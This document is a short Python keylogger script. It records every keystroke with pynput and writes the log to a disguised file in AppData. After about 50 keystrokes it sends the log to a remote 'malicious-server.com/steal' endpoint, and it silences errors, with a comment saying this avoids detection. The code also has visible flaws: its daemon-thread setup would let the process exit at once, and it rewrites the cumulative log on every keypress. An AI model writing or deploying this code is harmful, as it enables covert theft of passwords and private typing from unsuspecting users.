from pynput import keyboard
import requests
import os
import threading
import time

LOG_FILE = os.path.join(os.getenv('APPDATA'), 'system_logs.txt')  # Hidden in AppData
REMOTE_SERVER = "http://malicious-server.com/steal"

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

    with open(LOG_FILE, "a") as file:
        file.write(log)

    if len(log) > 50:  # Send after 50 keystrokes
        send_data(log)
        log = ""

def send_data(data):
    try:
        requests.post(REMOTE_SERVER, data={"keystrokes": data})
    except:
        pass  # Avoid detection by not throwing errors

def run_in_background():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:  
        time.sleep(10)  # Keep script running

if __name__ == "__main__":
    threading.Thread(target=run_in_background, daemon=True).start()
